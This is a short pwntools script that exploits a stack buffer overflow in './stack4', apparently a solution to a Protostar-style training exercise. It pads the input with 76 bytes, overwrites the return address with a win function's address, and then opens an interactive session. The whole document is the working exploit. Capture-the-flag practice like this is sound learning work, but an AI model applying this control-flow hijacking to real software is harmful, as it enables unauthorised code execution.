from pwn import *

p = process('./stack4')

padding = b'A'*76
win = p32(0x80483f4)

final = padding+win

p.sendline(final)
p.interactive()
